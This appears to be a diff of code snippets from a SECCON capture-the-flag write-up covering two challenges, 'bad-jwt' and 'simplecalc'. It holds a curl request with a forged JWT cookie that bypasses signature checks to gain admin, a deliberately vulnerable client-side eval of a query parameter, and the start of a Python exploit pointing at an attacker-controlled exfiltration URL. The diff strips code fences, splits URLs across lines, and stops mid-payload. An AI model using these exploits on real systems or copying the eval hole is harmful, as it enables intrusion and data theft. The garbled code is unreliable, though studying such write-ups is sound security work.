@@ -10,7 +10,7 @@ const verify = (token, secret) => {
 	const { header, payload, signature: expected_signature } = parseToken(token);
 
 	const calculated_signature = createSignature(header, payload, secret);
-	
+
 	const calculated_buf = Buffer.from(calculated_signature, 'base64');
 	const expected_buf = Buffer.from(expected_signature, 'base64');
 
@@ -20,11 +20,6 @@ const verify = (token, secret) => {
 
 	return payload;
 }
-```
-
-
-
-```
 // jwt.js
 const createSignature = (header, payload, secret) => {
 	const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
@@ -33,9 +28,9 @@ const createSignature = (header, payload, secret) => {
 }
 
 const algorithms = {
-	hs256: (data, secret) => 
+	hs256: (data, secret) =>
  base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
-	hs512: (data, secret) => 
+	hs512: (data, secret) =>
  base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
 }
 
@@ -45,52 +40,24 @@ const stringifyPart = (obj) => {
 
 // index.js
 const secret = require('crypto').randomBytes(32).toString('hex');
-```
-
-
-
-```
-curl http://bad-jwt.seccon.games:3000/ \
+curl http://bad-jwt.seccon.games:
+3000/ \
  -H "Cookie: session=eyJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ%3D%3D"
-```
-
-
-
-```
 const js_url = new URL(`http://${req.hostname}:${PORT}/js/index.js`);
 res.header('Content-Security-Policy', `default-src ${js_url} 'unsafe-eval';`);
-```
-
-
-
-```
-const params = new URLSearchParams(location.search); 
+const params = new URLSearchParams(location.search);
 const result = eval(params.get('expr')); // query parameterのexprをeval
 document.getElementById('result').innerText = result.toString(); // 結果をid=resultのDOMのinnerTextに格納
-```
-
-
-
-```
 <!-- /tmp/script.html -->
 <script>console.log('script.html is loaded.');</script>
-```
-
-
-
-```
 <!-- /tmp/index.html -->
 <!DOCTYPE html>
 index.html
-```
-
-
-
-```
 from urllib.parse import urlencode
 import requests
 
-target_url = "http://simplecalc.seccon.games:3000"
+target_url = "http://simplecalc.seccon.games:
+3000"
 attacker_url = "https://eoljd6ta1qq0d9f.m.pipedream.net"
 
 payload = f"""
